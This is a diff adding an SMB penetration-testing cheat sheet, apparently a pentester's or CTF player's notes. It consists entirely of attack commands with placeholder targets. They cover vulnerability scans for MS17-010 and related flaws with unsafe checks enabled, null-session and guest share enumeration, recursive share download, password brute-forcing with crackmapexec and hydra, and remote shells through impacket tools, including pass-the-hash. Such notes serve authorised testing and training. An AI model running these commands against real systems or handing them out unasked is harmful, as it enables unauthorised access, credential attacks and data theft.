@@ -1,0 +1,47 @@
+# SMB
+# Scan for Vuln * Look for MS17-010, MS08-067, CVE-2017-7494 *
+nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
+
+# Manual Testing
+smbmap -H <IP>
+smbmap -u '' -p '' -H <IP>
+smbmap -u 'guest' -p '' -H <IP>
+smbmap -u '' -p '' -H <IP> -R
+
+crackmapexec smb <IP>
+crackmapexec smb <IP> -u '' -p ''
+crackmapexec smb <IP> -u 'guest' -p ''
+crackmapexec smb <IP> -u '' -p '' --shares
+
+enum4linux -a <IP>
+
+smbclient --no-pass -L //$IP
+smbclient //<IP>/<SHARE>
+
+# Download all files from a directory recursively
+smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
+
+# Brute Force
+crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
+hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
+
+# Mount SMB Share
+mkdir /tmp/share
+sudo mount -t cifs //<IP>/<SHARE> /tmp/share
+sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share
+
+smbclient //<IP>/<SHARE>
+smbclient //<IP>/<SHARE> -U <USER>
+
+# Get a Shell
+psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
+atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
